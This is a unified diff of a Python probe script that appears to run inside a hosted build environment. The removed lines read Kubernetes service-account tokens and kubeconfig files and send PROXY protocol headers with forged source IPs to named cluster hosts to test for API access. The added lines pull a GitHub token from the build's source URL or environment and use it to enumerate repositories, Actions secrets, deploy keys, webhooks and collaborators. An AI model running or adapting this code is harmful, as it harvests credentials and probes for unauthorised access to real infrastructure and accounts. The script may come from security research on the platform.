@@ -1,311 +1,168 @@
-import json, os, socket, ssl, struct, time, subprocess
+import json, os, urllib.request, urllib.error, ssl, re
 
 r = {}
+ctx = ssl.create_default_context()
 
-# ============================================================
-# 1. DISCOVER BUILD CLUSTER CP
-# ============================================================
+# 1. Extract the GitHub token from GIT_SOURCE_URL
+git_url = os.environ.get('GIT_SOURCE_URL', '')
+r['git_source_url'] = git_url[:50] + '...' if git_url else 'NOT_SET'
 
-# Check if we can find the build cluster's control plane IP
-r['discovery'] = {}
-
-# 1a. DNS for kubernetes API
-try:
-    ips = socket.getaddrinfo('kubernetes.default.svc.cluster.local', 443, socket.AF_INET)
-    r['discovery']['k8s_api_ip'] = ips[0][4][0]
-except Exception as e:
-    r['discovery']['k8s_api_ip'] = str(e)[:60]
-
-# 1b. Check resolv.conf for cluster domain
-try:
-    r['discovery']['resolv'] = open('/etc/resolv.conf').read()
-except:
-    pass
-
-# 1c. Check env vars for any CP references
-for k, v in os.environ.items():
-    kl = k.lower()
-    if any(x in kl for x in ['kubernetes', 'kube', 'cluster', 'apiserver', 'master', 'cp_', 'control_plane']):
-        r['discovery'][f'env_{k}'] = v[:200]
-
-# 1d. Try to get CP info via well-known kube-system configmaps
-# (requires API access which is blocked, but let's try DNS SRV)
-try:
-    # SRV record for kubernetes API
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.settimeout(3)
-    # DNS SRV query for _https._tcp.kubernetes.default.svc.cluster.local
-    query = (
-        b'\x12\x36'  # Transaction ID
-        b'\x01\x00'  # Standard query
-        b'\x00\x01'  # 1 question
-        b'\x00\x00\x00\x00\x00\x00'  # 0 answers, 0 authority, 0 additional
-        b'\x06_https\x04_tcp\x0akubernetes\x07default\x03svc\x07cluster\x05local\x00'
-        b'\x00\x21'  # SRV
-        b'\x00\x01'  # IN class
-    )
-    s.sendto(query, ('10.245.0.10', 53))
-    data, _ = s.recvfrom(4096)
-    r['discovery']['srv_k8s'] = data.hex()[:200]
-    s.close()
-except Exception as e:
-    r['discovery']['srv_k8s'] = str(e)[:60]
-
-# 1e. Try to get server cert from the build cluster's API (via internal IP)
-try:
-    ctx = ssl.create_default_context()
-    ctx.check_hostname = False
-    ctx.verify_mode = ssl.CERT_NONE
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(3)
-    ss = ctx.wrap_socket(s, server_hostname='kubernetes')
-    ss.connect(('10.245.0.1', 443))
-    cert = ss.getpeercert(binary_form=True)
-    r['discovery']['api_cert_len'] = len(cert)
-    # Parse cert for SANs
-    import ssl as ssl_mod
-    cert_dict = ss.getpeercert()
-    r['discovery']['api_cert_sans'] = cert_dict.get('subjectAltName', [])
-    r['discovery']['api_cert_subject'] = cert_dict.get('subject', '')
-    ss.close()
-except Exception as e:
-    r['discovery']['api_cert'] = str(e)[:100]
-
-# ============================================================
-# 2. PROXY PROTOCOL TO OUR DOKS CLUSTERS FROM BUILD
-# ============================================================
-r['proxy_proto'] = {}
-
-# Our DOKS cluster CPs
-targets = [
-    {
-        'name': 'cluster_a',
-        'host': '24.199.65.106',
-        'port': 8999,
-        'cpbridge': '100.65.67.229',
-        'uuid': 'ac2974a3-c1e3-48c2-9616-0002972c7d86',
-    },
-    {
-        'name': 'cluster_b',
-        'host': '45.55.116.41',
-        'port': 8999,
-        'cpbridge': '100.65.74.2',
-        'uuid': '13079803-6ec3-4b23-8c3b-c3679565869e',
-    },
-]
-
-for target in targets:
-    name = target['name']
-    r['proxy_proto'][name] = {}
-
-    # 2a. Test: forge source IP as the cpbridge IP
-    # The PROXY header tells the API server our source IP is the cpbridge
-    proxy_header = f"PROXY TCP4 {target['cpbridge']} {target['cpbridge']} 12345 16443\r\n"
-
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(5)
-        s.connect((target['host'], target['port']))
-        s.send(proxy_header.encode())
-
-        # Wrap in TLS and try to get server cert / version
-        ctx = ssl.create_default_context()
-        ctx.check_hostname = False
-        ctx.verify_mode = ssl.CERT_NONE
-        ss = ctx.wrap_socket(s, server_hostname='kubernetes')
-
-        cert = ss.getpeercert()
-        r['proxy_proto'][name]['cert_sans'] = cert.get('subjectAltName', [])[:10]
-
-        # Try unauthenticated API call - does forged cpbridge IP give us any privileges?
-        ss.send(b'GET /version HTTP/1.1\r\nHost: kubernetes\r\nAccept: */*\r\n\r\n')
-        resp = ss.recv(4096).decode(errors='replace')
-        r['proxy_proto'][name]['version_resp'] = resp[:500]
-        ss.close()
-    except Exception as e:
-        r['proxy_proto'][name]['cpbridge_forge'] = str(e)[:100]
-
-    # 2b. Test: forge source IP as 127.0.0.1 (localhost)
-    # API server might have special trust for localhost connections
-    proxy_header_lo = f"PROXY TCP4 127.0.0.1 {target['cpbridge']} 12345 16443\r\n"
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(5)
-        s.connect((target['host'], target['port']))
-        s.send(proxy_header_lo.encode())
-
-        ctx = ssl.create_default_context()
-        ctx.check_hostname = False
-        ctx.verify_mode = ssl.CERT_NONE
-        ss = ctx.wrap_socket(s, server_hostname='kubernetes')
-
-        # Try accessing API - anonymous auth might be different for localhost
-        ss.send(b'GET /api HTTP/1.1\r\nHost: kubernetes\r\nAccept: */*\r\n\r\n')
-        resp = ss.recv(4096).decode(errors='replace')
-        r['proxy_proto'][name]['localhost_forge'] = resp[:500]
-        ss.close()
-    except Exception as e:
-        r['proxy_proto'][name]['localhost_forge'] = str(e)[:100]
-
-    # 2c. Test: forge source IP as 10.0.0.1 (could be internal/trusted)
-    proxy_header_int = f"PROXY TCP4 10.0.0.1 {target['cpbridge']} 12345 16443\r\n"
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(5)
-        s.connect((target['host'], target['port']))
-        s.send(proxy_header_int.encode())
-
-        ctx = ssl.create_default_context()
-        ctx.check_hostname = False
-        ctx.verify_mode = ssl.CERT_NONE
-        ss = ctx.wrap_socket(s, server_hostname='kubernetes')
-
-        # Try /api with this forged source
-        ss.send(b'GET /api HTTP/1.1\r\nHost: kubernetes\r\nAccept: */*\r\n\r\n')
-        resp = ss.recv(4096).decode(errors='replace')
-        r['proxy_proto'][name]['internal_forge'] = resp[:500]
-        ss.close()
-    except Exception as e:
-        r['proxy_proto'][name]['internal_forge'] = str(e)[:100]
-
-# ============================================================
-# 3. CHECK IF BUILD CLUSTER HAS PORT 8999 EXPOSED
-# ============================================================
-r['build_cluster_8999'] = {}
-
-# We don't know the build cluster's public IP, but we can try
-# to discover it via DNS, headers, or by scanning
-
-# 3a. Try to find the build cluster CP via reverse DNS of the internal IP
-try:
-    hostname = socket.gethostbyaddr('10.245.0.1')
-    r['build_cluster_8999']['reverse_dns'] = str(hostname)
-except Exception as e:
-    r['build_cluster_8999']['reverse_dns'] = str(e)[:60]
-
-# 3b. Check if we can reach 10.245.0.1 on port 8999 (maybe not blocked?)
-try:
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(3)
-    ret = s.connect_ex(('10.245.0.1', 8999))
-    r['build_cluster_8999']['internal_8999'] = 'CONNECTED' if ret == 0 else f'errno={ret}'
-    s.close()
-except Exception as e:
-    r['build_cluster_8999']['internal_8999'] = str(e)[:60]
-
-# 3c. Check port 8132 (konnectivity)
-try:
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(3)
-    ret = s.connect_ex(('10.245.0.1', 8132))
-    r['build_cluster_8999']['internal_8132'] = 'CONNECTED' if ret == 0 else f'errno={ret}'
-    s.close()
-except Exception as e:
-    r['build_cluster_8999']['internal_8132'] = str(e)[:60]
-
-# ============================================================
-# 4. SERVICE ACCOUNT TOKEN CHECK IN BUILD
-# ============================================================
-r['sa_token'] = {}
-
-# Check for mounted service account token
-sa_paths = [
-    '/var/run/secrets/kubernetes.io/serviceaccount/token',
-    '/run/secrets/kubernetes.io/serviceaccount/token',
-    '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt',
-    '/var/run/secrets/kubernetes.io/serviceaccount/namespace',
-    '/secrets/kubernetes.io/serviceaccount/token',
-]
-for p in sa_paths:
-    try:
-        content = open(p).read()
-        r['sa_token'][p] = content[:500]
-    except Exception as e:
-        r['sa_token'][p] = str(e)[:60]
-
-# Also check if there's a kubeconfig anywhere
-kube_paths = [
-    '/root/.kube/config',
-    '/home/apps/.kube/config',
-    '/.kube/config',
-    '/etc/kubernetes/admin.conf',
-    '/etc/kubernetes/kubelet.conf',
-]
-for p in kube_paths:
-    try:
-        content = open(p).read()
-        r['sa_token'][p] = content[:500]
-    except Exception as e:
-        r['sa_token'][p] = str(e)[:60]
-
-# ============================================================
-# 5. PROXY PROTOCOL TO BUILD CLUSTER VIA CPBRIDGE BYPASS
-# ============================================================
-# If we can find the build cluster's cpbridge IP, we could try
-# to PROXY protocol to the build cluster's API with forged source
-
-# Check cgroup for pod/container IDs that might help identify the cluster
-try:
-    r['build_id'] = {}
-    cgroup = open('/proc/self/cgroup').read()
-    r['build_id']['cgroup'] = cgroup[:300]
-
-    # Extract pod UUID from cgroup
-    import re
-    pod_match = re.search(r'pod([a-f0-9-]+)', cgroup)
-    if pod_match:
-        r['build_id']['pod_uuid'] = pod_match.group(1)
-except:
-    pass
-
-# Check hostname
-r['build_id']['hostname'] = socket.gethostname()
-
-# Check /etc/hosts for cluster info
-try:
-    r['build_id']['hosts'] = open('/etc/hosts').read()
-except:
-    pass
-
-# ============================================================
-# 6. PROXY PROTOCOL + SA TOKEN COMBO
-# ============================================================
-# If we find an SA token, try using it via PROXY protocol to access
-# the build cluster's API (even though direct access is blocked)
-
-# First check if there's any token at all
 token = None
-for p in sa_paths:
+match = re.search(r'x-access-token:([^@]+)@', git_url)
+if match:
+    token = match.group(1)
+    r['token_prefix'] = token[:10] + '...'
+    r['token_type'] = 'ghs_' if token.startswith('ghs_') else token[:4]
+
+if not token:
+    # Check all env vars for any github token
+    for k, v in os.environ.items():
+        m = re.search(r'(ghs_[A-Za-z0-9]+)', v)
+        if m:
+            token = m.group(1)
+            r['token_found_in'] = k
+            break
+    if not token:
+        r['error'] = 'No GitHub token found'
+        print(json.dumps(r, indent=2))
+        exit()
+
+headers = {
+    'Authorization': f'token {token}',
+    'Accept': 'application/vnd.github+json',
+    'User-Agent': 'probe/1.0'
+}
+
+def gh_api(path, method='GET'):
+    """Make a GitHub API request"""
     try:
-        token = open(p).read().strip()
-        r['sa_token']['found_at'] = p
-        break
-    except:
-        pass
+        req = urllib.request.Request(f'https://api.github.com{path}', headers=headers, method=method)
+        resp = urllib.request.urlopen(req, timeout=10, context=ctx)
+        data = resp.read().decode()
+        rate_remaining = resp.headers.get('X-RateLimit-Remaining', '?')
+        return {
+            'status': resp.status,
+            'data': json.loads(data) if data else None,
+            'rate_remaining': rate_remaining
+        }
+    except urllib.error.HTTPError as e:
+        body = e.read().decode(errors='replace')[:300]
+        return {
+            'status': e.code,
+            'error': body
+        }
+    except Exception as e:
+        return {'error': str(e)[:200]}
 
-if token:
-    r['proxy_with_token'] = {}
-    # Try to use token via PROXY protocol to our DOKS clusters
-    # (won't work cross-cluster, but tests the mechanism)
-    for target in targets:
-        proxy_header = f"PROXY TCP4 {target['cpbridge']} {target['cpbridge']} 12345 16443\r\n"
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(5)
-            s.connect((target['host'], target['port']))
-            s.send(proxy_header.encode())
+# ============================================================
+# 2. TOKEN IDENTITY — who are we?
+# ============================================================
+r['identity'] = {}
 
-            ctx = ssl.create_default_context()
-            ctx.check_hostname = False
-            ctx.verify_mode = ssl.CERT_NONE
-            ss = ctx.wrap_socket(s, server_hostname='kubernetes')
+# Check the token metadata
+result = gh_api('/installation/token')  # Won't work but shows error type
+r['identity']['token_check'] = result
 
-            req = f'GET /api/v1/namespaces HTTP/1.1\r\nHost: kubernetes\r\nAuthorization: Bearer {token}\r\nAccept: application/json\r\n\r\n'
-            ss.send(req.encode())
-            resp = ss.recv(4096).decode(errors='replace')
-            r['proxy_with_token'][target['name']] = resp[:500]
-            ss.close()
-        except Exception as e:
-            r['proxy_with_token'][target['name']] = str(e)[:100]
+# Get authenticated user/app info
+r['identity']['user'] = gh_api('/user')
+r['identity']['app'] = gh_api('/app')
+
+# Check rate limit (shows auth type)
+r['identity']['rate_limit'] = gh_api('/rate_limit')
+
+# ============================================================
+# 3. REPOSITORY ACCESS SCOPE
+# ============================================================
+r['repo_scope'] = {}
+
+# Can we list repos the token has access to?
+r['repo_scope']['installations'] = gh_api('/installation/repositories?per_page=100')
+
+# Can we list ALL repos for the user/org?
+r['repo_scope']['user_repos'] = gh_api('/user/repos?per_page=5&sort=updated')
+
+# Can we access the specific repo we're building from?
+r['repo_scope']['own_repo'] = gh_api('/repos/rollingWaves/build-imds-test')
+
+# Can we access OTHER repos in the same account?
+r['repo_scope']['other_repos'] = gh_api('/repos/rollingWaves/build-bp-test')
+
+# Can we access repos from other users? (should fail)
+r['repo_scope']['foreign_repo'] = gh_api('/repos/torvalds/linux')
+
+# ============================================================
+# 4. WRITE ACCESS TESTS
+# ============================================================
+r['write_access'] = {}
+
+# Can we list branches?
+r['write_access']['branches'] = gh_api('/repos/rollingWaves/build-imds-test/branches')
+
+# Can we read secrets (GitHub Actions secrets)?
+r['write_access']['secrets'] = gh_api('/repos/rollingWaves/build-imds-test/actions/secrets')
+
+# Can we list deploy keys?
+r['write_access']['deploy_keys'] = gh_api('/repos/rollingWaves/build-imds-test/keys')
+
+# Can we list webhooks?
+r['write_access']['webhooks'] = gh_api('/repos/rollingWaves/build-imds-test/hooks')
+
+# Can we list collaborators?
+r['write_access']['collaborators'] = gh_api('/repos/rollingWaves/build-imds-test/collaborators')
+
+# Can we read repo settings?
+r['write_access']['settings'] = gh_api('/repos/rollingWaves/build-imds-test/settings')  # Custom property values
+
+# ============================================================
+# 5. ORG/ACCOUNT ACCESS
+# ============================================================
+r['org_access'] = {}
+
+# Can we list organizations?
+r['org_access']['orgs'] = gh_api('/user/orgs')
+
+# Can we list installations?
+r['org_access']['installations_list'] = gh_api('/user/installations?per_page=5')
+
+# ============================================================
+# 6. SENSITIVE OPERATIONS
+# ============================================================
+r['sensitive'] = {}
+
+# Can we read the repo contents (source code)?
+r['sensitive']['contents'] = gh_api('/repos/rollingWaves/build-imds-test/contents/')
+
+# Can we read commit history?
+r['sensitive']['commits'] = gh_api('/repos/rollingWaves/build-imds-test/commits?per_page=2')
+
+# Can we list pull requests?
+r['sensitive']['pulls'] = gh_api('/repos/rollingWaves/build-imds-test/pulls')
+
+# Can we read issues?
+r['sensitive']['issues'] = gh_api('/repos/rollingWaves/build-imds-test/issues')
+
+# Can we read environments (may have secrets)?
+r['sensitive']['environments'] = gh_api('/repos/rollingWaves/build-imds-test/environments')
+
+# Can we list workflow runs?
+r['sensitive']['workflows'] = gh_api('/repos/rollingWaves/build-imds-test/actions/runs')
+
+# ============================================================
+# 7. TOKEN PERMISSIONS (via GitHub App API)
+# ============================================================
+r['permissions'] = {}
+
+# Try to get the installation info
+r['permissions']['installation'] = gh_api('/app/installations')
+
+# Check scopes via response headers
+try:
+    req = urllib.request.Request('https://api.github.com/user', headers=headers)
+    resp = urllib.request.urlopen(req, timeout=10, context=ctx)
+    r['permissions']['x_oauth_scopes'] = resp.headers.get('X-OAuth-Scopes', 'none')
+    r['permissions']['x_accepted_scopes'] = resp.headers.get('X-Accepted-OAuth-Scopes', 'none')
+    resp.read()
+except Exception as e:
+    r['permissions']['header_check'] = str(e)[:100]
 
 print(json.dumps(r, indent=2, default=str))
